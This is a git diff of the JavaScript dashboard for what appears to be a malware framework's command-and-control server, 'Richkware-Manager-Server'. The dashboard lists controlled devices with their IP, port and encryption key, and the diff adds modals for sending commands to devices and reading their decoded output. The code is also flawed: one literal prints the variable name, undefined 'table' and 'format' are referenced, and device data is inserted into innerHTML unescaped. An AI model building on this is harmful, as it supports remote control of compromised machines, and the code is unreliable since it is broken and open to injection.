@@ -28,13 +28,11 @@ function createDevicesTableHeader() {
     var row = document.createElement("tr");
     row.innerHTML = ( //"<th>Index</th>" +
         "<th>Name</th>" +
-        "<th>IP</th>" +
-        "<th>Server Port</th>" +
         "<th>Last Connection</th>" +
-        "<th>Encryption Key</th>" +
-        "<th>Associated User</th>" +
+        "<th>User Associated</th>" +
         "<th>Commands</th>" +
-        "<th>Commands Output</th>");
+        "<th>Commands Output</th>" +
+        "<th colspan='3'>Actions</th>");
 
     thead.appendChild(row);
     devicesTable.appendChild(thead);
@@ -64,28 +62,26 @@ function loadDevicesJSONtoTable(devicesListJSON) {
         var serverPort = devicesList[i].serverPort;
         var lastConnection = devicesList[i].lastConnection;
         var encryptionKey = devicesList[i].encryptionKey;
-        var associatedUser = devicesList[i].associatedUser;
+        var userAssociated = devicesList[i].userAssociated;
         var commands = devicesList[i].commands;
         var commandsOutput = devicesList[i].commandsOutput;
 
         var row = document.createElement("tr");
         row.id = "tableRow" + i;
-
+        var collapse = "<div class='collapse' id='coll-" + name + "' aria-labelledby='tableRow" + i + "'><table class='table'><tr><td>IP:Port</td><td>" + IP + ":" + serverPort + "</td></tr><tr><td>Ecryption Key</td><td> + encryptionKey + </td></tr></table></div>";
         row.innerHTML = (
             //"<td>" + (index + 1) + "</td>" +
-            "<td>" + name + "</td>" +
-            "<td>" + IP + "</td>" +
-            "<td>" + serverPort + "</td>" +
+            "<td><a tabindex='0' onclick='popInfo()' type='button' data-html=\"true\" class='btn btn-outline-info' data-toggle='popover' title='" + name + " Info' data-content='<div><p>IP:Port - " + IP + ":" + serverPort + "</p><p>Encryption Key - " + encryptionKey + "</p></div>'>" + name + "</a></td>" +
+            //"<td><button class=\"btn\" data-toggle=\"collapse\" data-target=\"#coll-" + name + "\" aria-expanded=\"true\" aria-controls=\"coll-" + name +"\">" + name + "</button>" +
             "<td>" + lastConnection + "</td>" +
-            "<td>" + encryptionKey + "</td>" +
-            "<td>" + associatedUser + "</td>" +
+            "<td>" + userAssociated + "</td>" +
             "<td>" + commands + "</td>" +
             "<td>" + commandsOutput + "</td>" +
-            "<td><button type=\"button\" id=\"manage#" + name + "\" class=\"btn btn-secondary\" onclick=\"openReverseCommands('" + name + "')\">Reverse Commands</button></td>" +
-            "<td><button type=\"button\" id=\"commandsOutput#" + name + "\" class=\"btn btn-secondary\" onclick=\"openReverseCommandsOutput('" + name + "')\">Show Output</button></td>" +
-            "<td><button type=\"button\" id=\"remove#" + name + "#" + i + "\" class=\"btn btn-warning\" onclick=\"deleteDevice('" + name + "', '" + i + "')\">Remove</button></td>");
+            "<td><button title='Insert Commands' type=\"button\" id=\"manage#" + name + "\" class=\"btn btn-secondary\" onclick=\"commandsM('" + name + "')\"><span class=\"fa fa-terminal\"></span></button></td>" +
+            "<td><button title='Output' type=\"button\" id=\"commandsOutput#" + name + "\" class=\"btn btn-primary\" onclick=\"outputM('" + name + "')\"><span class=\"fa fa-eye\"></span></button></td>" +
+            "<td><button title='Remove' type=\"button\" id=\"remove#" + name + "#" + i + "\" class=\"btn btn-danger\" onclick=\"deleteDevice('" + name + "', '" + i + "')\"><span class=\"fa fa-trash\"></span></button></td>");
 
-        //        "<td><button type=\"button\" class=\"btn btn-warning\" onclick=\"location.href=\'/Richkware-Manager-Server/device?name=" + name + "\';\">Remove</button></td>");
+
 
         tbody.appendChild(row);
         //      index++
@@ -93,12 +89,57 @@ function loadDevicesJSONtoTable(devicesListJSON) {
     devicesTable.appendChild(tbody);
 }
 
-function openReverseCommands(name) {
-    window.location.replace("/Richkware-Manager-Server/reverse-commands.html?device=" + name)
+function infoDev(devL){
+    return '<table class="table" style="padding-left:50px;">'+
+        '<tr>'+
+        '<td>IP:Port</td>'+
+        '<td>'+devL.ip + ':' + devL.serverPort +'</td>'+
+        '</tr>'+
+        '<tr>'+
+        '<td>EncryptionKey:</td>'+
+        '<td>'+devL.encryptionKey+'</td>'+
+        '</tr>'+
+        '</table>';
 }
 
-function openReverseCommandsOutput(deviceName) {
-    window.location.replace("/Richkware-Manager-Server/reverse-commands-output.html?device=" + deviceName)
+function popInfo(){
+    $("[data-toggle=popover]").popover();
+}
+
+//Open CommandsModal
+function commandsM(device){
+    console.log(device);
+    $('#ModalCommandTitle').text("Device: " + device);
+    $('#ModalCommandTitle').val(device);
+    $('#text-area').prop('readonly', false);
+    $('#text-area').val("")
+    $('#submit-commands').show();
+    $('#ModalCommand').modal('show');
+}
+
+//Open CommandOutputModal
+function outputM(device){
+    console.log(device);
+    $('#ModalCommandTitle').text("Device: " + device);
+    $('#ModalCommandTitle').val(device);
+    $('#text-area').prop('readonly', true);
+    $('#submit-commands').hide();
+    getOutput(device);
+}
+
+function handleReverseCommandOutput(encCommands) {
+    //TODO PROVVISORIO: decidere come vogliamo fare (tipo di dato da ritornare e tutte cose...)
+    if (encCommands != "") {
+        var previous = ""
+        $("#text-area").val(atob(encCommands[0]))
+        for (var i = 1; i < encCommands.length; ++i) {
+            previous = $("#text-area").val()
+            $('#text-area').val(previous + "\n" + atob(encCommands[i]))
+        }
+    } else {
+        $('#text-area').val("No output found for this device!")
+    }
+    $('#ModalCommand').modal('show');
 }
 
 function deleteDevice(device, indexTableRow) {
@@ -110,6 +151,7 @@ function deleteDevice(device, indexTableRow) {
         }
     });
 }
+
 
 /*
 function loadUsersTable() {
@@ -151,6 +193,21 @@ function newConnection() {
 $(document).ready(function() {
     loadDevicesTable();
     setInterval(loadDevicesTable, 30000);
+
+    $('#devicesTable tbody').on('click', 'button.btn', function(){
+        var tr = $(this).closest('tr');
+        var row = table.row( tr );
+
+        if(row.child.isShown()){
+            // This row is already open - close it
+            row.child.hide();
+            tr.removeClass('shown');
+        } else {
+            // Open this row
+            row.child(format(row.data())).show();
+            tr.addClass('shown');
+        }
+    });
 
     $("[id*=remove]").click(function () {
         var dev = event.target.id.split("#")[1];
